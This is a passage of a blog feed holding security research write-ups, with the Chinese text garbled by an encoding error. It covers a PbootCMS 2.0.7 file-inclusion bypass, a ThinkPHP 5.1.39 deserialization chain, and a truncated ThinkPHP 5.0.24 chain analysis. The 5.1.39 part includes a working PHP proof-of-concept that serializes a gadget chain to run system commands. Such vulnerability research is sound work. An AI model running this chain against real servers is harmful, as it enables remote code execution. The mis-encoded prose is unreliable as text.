æ˜¯è¿™é‡Œå¯¹å±é™©å­—ç¬¦çš„è¿‡æ»¤ä¸è§„èŒƒå¯¼è‡´ï¼Œå¯ä»¥ç›´æ¥åŒå†™ç»•è¿‡</p><p><img src="/images/PbootCMS-2.0.7/20200916201028.png" alt=""></p><p>å¾€ä¸‹çœ‹</p><p><img src="/images/PbootCMS-2.0.7/20200916202648.png" alt=""></p><p>å½“æ¨¡æ¿æ–‡ä»¶ä¸åœ¨ç¼“å­˜ä¸­çš„æ—¶å€™ï¼Œä¼šè¯»å–$tpl_fileä¸­çš„å†…å®¹ï¼Œç„¶åå†™å…¥ç¼“å­˜æ–‡ä»¶ä¸­å¹¶ä¸”åŒ…å«ã€‚<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“parserå‡½æ•°çš„å‚æ•°å¯ä»¥è¢«æ§åˆ¶çš„æ—¶å€™ï¼Œå°±ä¼šé€ æˆä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«ã€‚<br>æˆ‘ä»¬è¦å¯»æ‰¾ä¸€ä¸ªå‚æ•°å¯æ§çš„parserçš„ç‚¹ï¼Œç„¶åå¯ä»¥åœ¨å‰å°æ§åˆ¶å™¨ <strong>TagController</strong> çš„index()ä¸­æ‰¾åˆ°</p><p><img src="/images/PbootCMS-2.0.7/20200916202918.png" alt=""></p><p>è¿™é‡Œè°ƒç”¨äº†parser()ï¼Œå‚æ•°$tagstplæ¥è‡ª <strong>request()</strong> æ–¹æ³•ï¼Œè¿™é‡Œçš„å¤§æ¦‚æ„æ€å°±æ˜¯éœ€è¦POSTæäº¤ä¸€ä¸ªåä¸ºtagstplçš„å˜é‡ï¼Œå°±ä¸è·Ÿè¿‡å»çœ‹äº†ã€‚<br>$tagstplè¿˜ä¼šæ‹¼æ¥$this-&gt;htmldirï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç©¿è¶Šç›®å½•ï¼Œæ€ä¹ˆæ‹¼æ¥ä¹Ÿæ— æ‰€è°“äº†ã€‚<br>é‚£è¿™ä¹ˆè¯´æˆ‘ä»¬åªéœ€è¦postæäº¤æˆ‘ä»¬çš„payloadå°±å¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶äº†ã€‚</p><p>è¯»å–ä¸€ä¸‹æ ¹ç›®å½•ä¸‹çš„phpinfo.php</p><p><img src="/images/PbootCMS-2.0.7/20200916203938.png" alt=""></p><p>æˆåŠŸäº†ã€‚</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹åœ¨2.0.8ç‰ˆæœ¬å°±å³æ—¶åšå‡ºäº†ä¿®å¤ï¼Œçœ‹çœ‹å®˜æ–¹æ˜¯æ€ä¹ˆä¿®å¤çš„</p><p><img src="/images/PbootCMS-2.0.7/20200916205007.png" alt=""><br><img src="/images/PbootCMS-2.0.7/20200916204438.png" alt=""></p><p>ç”¨è‡ªå®šä¹‰çš„ <strong>preg_replace_r()</strong> å‡½æ•°ä»£æ›¿äº†åŸæœ¬çš„ <strong>preg_replace()</strong> ï¼Œé€’å½’æ›¿æ¢</p><p><img src="/images/PbootCMS-2.0.7/20200916205413.png" alt=""></p><p>è¿™é‡Œä½¿$tagstplå¼ºåˆ¶ä¸ºhtmlåç¼€ï¼Œæ— æ³•è¯»å–ä»»æ„æ–‡ä»¶äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰çœ‹åˆ°ç½‘ä¸Šæœ‰å…³äºè¿™ä¸ªæ¼æ´åˆ†æçš„æ–‡ç« ï¼Œè¿™ä¸¤å¤©æ²¡ä»€ä¹ˆäº‹æƒ…åšå°±æƒ³ç€è‡ªå·±ä¹Ÿçœ‹ä¸€çœ‹ï¼Œåˆ†ææ¼æ´çš„æˆå› ï¼Œå¤ç°ä¸€ä¸‹ã€‚&lt;br&gt;å…ˆåœ¨githubä¸Šé¢ä¸‹è½½å¥½å¯¹åº”ç‰ˆæœ¬çš„æºç ï¼Œphpstudyä¸€æŠŠæ¢­ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ¼æ´å¤ç°" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp_5.1.39ååºåˆ—åŒ–åˆ†æ</title>
    <link href="http://yoursite.com/2020/09/16/thinkphp-5-1-39/"/>
    <id>http://yoursite.com/2020/09/16/thinkphp-5-1-39/</id>
    <published>2020-09-16T02:28:25.000Z</published>
    <updated>2020-09-16T05:08:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><blockquote><p>thinkphp5.1.39<br>php7.3</p></blockquote><p>ä»ç½‘ä¸Šä¸‹è½½å¥½æºç ï¼Œæ‰“å¼€ <strong>application\index\controller\Index.php</strong> æ–‡ä»¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š</p><a id="more"></a><p><img src="/images/thinkphp5.1.39/20200916104528.png" alt=""></p><p>æ‰“å¼€æ¡†æ¶çš„debugæ¨¡å¼ï¼Œé…ç½®å¥½phpstorm+chromeçš„è°ƒè¯•æ¨¡å¼ï¼Œä¾¿å¯ä»¥å¼€å§‹äº†ã€‚</p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>æœç´¢ <strong>__destruct()</strong> æ–¹æ³•ï¼Œå’Œthinkphp5.0.xä¸€æ ·ï¼Œè¿˜æ˜¯åœ¨ <strong>Windows</strong>ç±»ä¸­</p><p><img src="/images/thinkphp5.1.39/20200916104940.png" alt=""></p><p>è·Ÿè¿› <strong>removeFiles()</strong></p><p><img src="/images/thinkphp5.1.39/20200916105249.png" alt=""></p><p>è¿™é‡Œçš„ <strong>file_exists()</strong> ä¸­çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå…¶å‚æ•°ä¼šè¢«å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œå¯ä»¥è§¦å‘ <strong>__toString()</strong> æ–¹æ³•ï¼Œæœç´¢ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œå¾ˆå¿«å°±æ‰¾åˆ°äº†ï¼Œåœ¨ <strong>vendor\phpspec\prophecy\src\Prophecy\Argument\Token\ExactValueToken.php</strong> æ–‡ä»¶ä¸‹çš„ <strong>ExactValueToken</strong> ç±»ä¸­æœ‰ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ã€‚</p><p><img src="/images/thinkphp5.1.39/20200916105804.png" alt=""></p><p>è¿™é‡Œçš„ <strong>$this-&gt;util-&gt;stringify($this-&gt;value)</strong> ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œæ˜¯å¯ä»¥å®Œç¾è§¦å‘ <strong>__call()</strong> çš„åœ°æ–¹ï¼Œç„¶åæœç´¢ä¸€ä¸‹__call()ï¼Œåœ¨ <strong>Request</strong> ç±»ä¸­</p><p><img src="/images/thinkphp5.1.39/20200916110401.png" alt=""></p><p>__callæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è°ƒç”¨çš„é‚£ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯ <strong>stringify</strong> ï¼Œç¬¬äºŒä¸ªå‚æ•°ä»¥æ•°ç»„çš„æ–¹å¼ä¼ é€’ï¼Œæ•°ç»„ä¸­çš„å€¼æ˜¯è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•æ—¶ä¼ é€’çš„å‚æ•°ã€‚<br>åœ¨è¿™é‡Œ <strong>$this-&gt;hook</strong> æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯ <strong>array_unshift</strong>ä¼šæŠŠ <strong>$this</strong> æ”¾åˆ° <strong>$args</strong> æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬åªèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,&quot;ä»»æ„æ–¹æ³•&quot;],[$this,ä»»æ„å‚æ•°])</span><br><span class="line">ä¹Ÿå°±æ˜¯</span><br><span class="line">$obj-&gt;$func($this,$argv)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¾ˆéš¾ç›´æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ï¼Œä½†æ˜¯Thinkphpä½œä¸ºä¸€ä¸ªwebæ¡†æ¶,<br>Requestç±»ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å°±æ˜¯è¿‡æ»¤å™¨ filter(ThinkPHPçš„å¤šä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œéƒ½æ˜¯å‡ºè‡ªæ­¤å¤„)<br>æˆ‘ä»¬åªèƒ½æƒ³åŠæ³•é€šè¿‡è°ƒç”¨åˆ«çš„æ–¹æ³•æ¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œç„¶åä¹Ÿæ˜¯åœ¨ <strong>Request</strong> ç±»ä¸­æ‰¾åˆ°äº† <strong>filterValue</strong> æ–¹æ³•</p><p><img src="/images/thinkphp5.1.39/20200916121642.png" alt=""></p><p>è¿™é‡Œå¯ä»¥è°ƒç”¨ <strong>call_user_func</strong> æ¥æ‰§è¡Œä»»æ„å‡½æ•°ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªè°ƒç”¨ <strong>filterValue</strong> çš„ç‚¹ï¼Œå‘ç° <strong>input</strong> æ–¹æ³•ç¬¦åˆæ¡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (false &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">            &#x2F;&#x2F; è·å–åŸå§‹æ•°æ®</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">        Â·Â·Â·Â·Â·Â·</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; è§£æè¿‡æ»¤å™¨</span><br><span class="line">        $filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        if (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">            if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;</span><br><span class="line">                &#x2F;&#x2F; æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span><br><span class="line">                $this-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">        &#125;</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œçš„å‚æ•°ä¸å¯æ§ï¼Œéœ€è¦å†å¯»æ‰¾inputå‚æ•°å¯æ§çš„ç‚¹ï¼Œåœ¨ <strong>param()</strong> ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">        $method &#x3D; $this-&gt;method(true);</span><br><span class="line">        Â·Â·Â·Â·Â·Â·</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span><br><span class="line">        $this-&gt;param &#x3D; array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line"></span><br><span class="line">        $this-&gt;mergeParam &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (true &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">        &#x2F;&#x2F; è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span><br><span class="line">        $file &#x3D; $this-&gt;file();</span><br><span class="line">        $data &#x3D; is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line">        return $this-&gt;input($data, &#39;&#39;, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæœ‰ <strong>$this-&gt;param</strong> æ˜¯å¯æ§çš„ï¼Œ<strong>$filter</strong> ä¸ºç©ºï¼Œéœ€è¦å†å¯»æ‰¾è°ƒç”¨ <strong>param()</strong> çš„ç‚¹ï¼Œ</p><p><img src="images/thinkphp5.1.39/20200916123501.png" alt=""></p><p>è¿™é‡Œ <strong>isAjax()</strong> å‚æ•°æ—¶å¯æ§çš„ï¼Œå¹¶ä¸” <strong>param()</strong> çš„å‚æ•° <code>$this-&gt;config\[&#39;var_ajax&#39;\]</code> ä¹Ÿæ˜¯å¯æ§çš„ï¼Œé‚£è¿™æ · <strong>param()</strong> ä¸­ <strong>$name</strong>ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå†çœ‹ <strong>input()</strong> æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (false &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">            &#x2F;&#x2F; è·å–åŸå§‹æ•°æ®</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">        Â·Â·Â·Â·Â·Â·</span><br><span class="line"></span><br><span class="line">            $data &#x3D; $this-&gt;getData($data, $name);</span><br><span class="line">            Â·Â·Â·Â·Â·Â·</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; è§£æè¿‡æ»¤å™¨</span><br><span class="line">        $filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        if (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">            Â·Â·Â·Â·Â·Â·</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br></pre></td></tr></table></figure><p><strong>$data</strong> æ¥è‡ª <strong>getData()</strong> æ–¹æ³•ï¼Œ <strong>$filter</strong> æ¥è‡ª <strong>getFilter()</strong> ,å…ˆçœ‹ä¸€ä¸‹ <strong>getData()</strong> </p><p><img src="/inages/thinkphp5.1.39/20200916125029.png" alt=""></p><p>è¿™é‡Œ <strong>$data = $data[$val] = $data[$name]</strong> ï¼Œè€Œ <strong>$name</strong> æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ <strong>$data</strong> ä¹Ÿæ˜¯å¯æ§çš„ï¼Œ<br>å†çœ‹ä¸€ä¸‹ <strong>getFilter()</strong> </p><p><img src="/images/thinkphp5.1.39/20200916125457.png" alt=""></p><p><strong>$filter = $filter ?: $this-&gt;filter;</strong>ï¼Œä¹Ÿæ˜¯å¯æ§çš„ã€‚<br>æ‰€ä»¥åœ¨ <strong>input()</strong>ä¸­è°ƒç”¨ <strong>filterValue()</strong> æ–¹æ³•æ—¶çš„å‚æ•° <strong>$data</strong> å’Œ <strong>$filter</strong> éƒ½æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯ <strong>filterValue()</strong> ä¸­æˆ‘ä»¬è°ƒç”¨ <strong>call_user_func</strong> æ—¶çš„å‚æ•°ï¼Œè¿™æ ·æ•´æ¡popé“¾å°±ç®—æ„é€ å®Œæˆäº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">namespace think &#123;</span><br><span class="line">class Request &#123;</span><br><span class="line">protected $hook &#x3D; [];</span><br><span class="line">protected $filter;</span><br><span class="line">protected $config &#x3D; [];</span><br><span class="line">protected $param &#x3D; [];</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;hook &#x3D; [&#39;stringify&#39;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">$this-&gt;filter &#x3D; [&#39;system&#39;];</span><br><span class="line">$this-&gt;config[&#39;var_ajax&#39;] &#x3D; &#39;1&#39;;</span><br><span class="line">$this-&gt;param &#x3D; [&#39;calc&#39;,&#39;1&#39;&#x3D;&gt;&#39;calc&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Prophecy\Argument\Token &#123;</span><br><span class="line">use think\Request;</span><br><span class="line">class ExactValueToken &#123;</span><br><span class="line">    private $value;</span><br><span class="line">    private $string;</span><br><span class="line">    private $util;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">    $this-&gt;string &#x3D; null;</span><br><span class="line">    $this-&gt;util &#x3D; new Request();</span><br><span class="line">    $this-&gt;value &#x3D; [&#39;111&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">use Prophecy\Argument\Token\ExactValueToken;</span><br><span class="line">class Windows &#123;</span><br><span class="line">private $files &#x3D; [];</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;files &#x3D; [new ExactValueToken()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Windows();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ</p><p><img src="/images/thinkphp5.1.39/20200916130058.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;thinkphp5.1.39&lt;br&gt;php7.3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä»ç½‘ä¸Šä¸‹è½½å¥½æºç ï¼Œæ‰“å¼€ &lt;strong&gt;application\index\controller\Index.php&lt;/strong&gt; æ–‡ä»¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.24ååºåˆ—åŒ–popé“¾åˆ†æ</title>
    <link href="http://yoursite.com/2020/09/13/thinkphp5-rce/"/>
    <id>http://yoursite.com/2020/09/13/thinkphp5-rce/</id>
    <published>2020-09-13T08:01:55.233Z</published>
    <updated>2020-09-16T05:02:34.045Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="å…³äºæœ¬æ–‡"><a href="#å…³äºæœ¬æ–‡" class="headerlink" title="å…³äºæœ¬æ–‡"></a>å…³äºæœ¬æ–‡</h2><p>è¿™ç¯‡æ˜¯å¯¹thinkphp5.0.24ååºåˆ—åŒ–æ¼æ´çš„å¤ç°ï¼Œå› ä¸ºä»£ç é‡æœ‰ç‚¹å¤§ï¼Œåˆ†æèµ·æ¥å±å®è®©äººè‡ªé—­ï¼Œçœ‹çš„æˆ‘å¤´ç–¼ã€‚<br>æœ¬æ–‡åˆ†æä¼šé™„å¸¦pocã€‚</p><a id="more"></a><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä»ç½‘ä¸Šä¸‹è½½ä¸‹æ¥æ­¤ç‰ˆæœ¬çš„ä»£ç ï¼Œç„¶åæ‰“å¼€ <strong>application\index\controller\index.php</strong>ï¼Œå†™ä¸‹å¦‚ä¸‹ä»£ç ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913175057.png" alt=""></p><p>phpstorm+xdebugé…ç½®ï¼Œä¸‹è½½ä¸€ä¸ªchromeæ’ä»¶ï¼š<strong>xdebug helper</strong>ï¼Œè·Ÿç€ç½‘ä¸Šæ•™ç¨‹è®¾ç½®ä¸€ä¸‹ï¼Œç„¶åphpstormç›‘å¬ï¼Œå°±å¯ä»¥æ–­ç‚¹å•æ­¥è·Ÿè¸ªè°ƒè¯•äº†ã€‚<br>ç„¶åè¿˜å¼€äº†æ¡†æ¶çš„debugæ¨¡å¼ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913180513.png" alt=""></p><h2 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h2><p>å…¨å±€æœç´¢ä¸€ä¸‹<strong>__destruct()</strong>æ–¹æ³•ï¼Œåœ¨<strong>Windows</strong>ç±»ä¸­å‘ç°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913180841.png" alt=""></p><p>è·Ÿè¿›removeFiles()æ–¹æ³•</p><p><img src="/images/thinkphp5.0.24/20200913181028.png" alt=""></p><p>è¿™é‡Œçš„<strong>file_exists()</strong>å‡½æ•°ä¼šè§¦å‘<strong>__toString()</strong>æ–¹æ³•ï¼Œå…¨å±€æœç´¢__tostring()ï¼Œåœ¨<strong>Model</strong>ç±»ä¸­å‘ç°å¯ä»¥åˆ©ç”¨çš„ï¼Œå› ä¸ºModelæ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½è¢«å®ä¾‹åŒ–ä¸ºå¯¹è±¡ï¼Œå¿…é¡»æ‰¾åˆ°ä»–çš„å­ç±»<strong>Pivot</strong>ï¼Œçˆ¶ç±»ä¸­çš„æ–¹æ³•å­ç±»æ˜¯å¯ä»¥ç»§æ‰¿çš„å˜›ï¼Œä¸€ä¼šç”¨<strong>Pivot</strong>å°±å¥½äº†ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913181459.png" alt=""><br><img src="/images/thinkphp5.0.24/20200913181556.png" alt=""></p><p><strong>__toStrint()</strong> =&gt; <strong>toJson()</strong> =&gt; <strong>toArray()</strong></p><p>è·Ÿè¿›toArray()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å‰åŠéƒ¨åˆ†æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œä¸ç”¨ç®¡ä»–ï¼Œç›´æ¥çœ‹ååŠéƒ¨åˆ†</p><p><img src="/images/thinkphp5.0.24/20200913182049.png" alt=""></p><p>çœ‹è¿™ä¸€è¡Œä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] &#x3D; $value ? $value-&gt;getAttr($attr) : null;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <strong>value</strong> å’Œ <strong>attr</strong> éƒ½æ˜¯å¯æ§çš„ï¼Œè¿™ä¸æ˜¯æ­£å¥½å¯ä»¥è§¦å‘<strong>__call</strong>æ–¹æ³•å—ï¼Œäºæ˜¯å‘å‰çœ‹çœ‹è¿™ä¸¤ä¸ªå˜é‡æ˜¯æ€ä¹ˆæ¥çš„ã€‚<br>é¦–å…ˆ <strong>this-&gt;append</strong>ä¸ä¸ºç©ºä¸”ä¸ºæ•°ç»„ï¼Œæ•°ç»„é‡Œé¢çš„å€¼ä¸èƒ½ä¸ºæ•°ç»„ï¼Œå¹¶ä¸”ä¸èƒ½åŒ…å«ç‚¹å·ã€‚è¿™ä¸ª <code>loader::parseName()</code> å°±æ˜¯è½¬æ¢å¤§å°å†™çš„å‡½æ•°ï¼Œä¸ç”¨ç®¡ã€‚ç„¶åå¾€ä¸‹ç¬¬902è¡Œï¼Œå¦‚æœ <code>$this-&gt;$relation()</code> å­˜åœ¨å¹¶ä¸”æŠŠå…¶è¿”å›å€¼èµ‹å€¼ç»™ <strong>$modeRelation</strong> ã€‚<br>å› ä¸ºè¿™é‡Œæ˜¯ <code>$this-&gt;$relation()</code> è€Œä¸æ˜¯ <code>$this-&gt;relation()</code> ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ <strong>$relation</strong>å‚æ•°è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„ä»»æ„æ–¹æ³•<br>å¾€ä¸‹æ‰¾äº†æ‰¾æ‰¾åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è¿”å›ä»»æ„å€¼ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913184226.png" alt=""></p><p>ç„¶åä¸‹é¢è¿™è¡Œä»£ç ï¼Œè°ƒç”¨äº† <strong>$modeRelation</strong> ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”æŠŠè¿”å›å€¼ä¼ ç»™ <strong>$value</strong> ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value         &#x3D; $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¸€ä¸‹</p><p><img src="/images/thinkphp5.0.24/20200913184844.png" 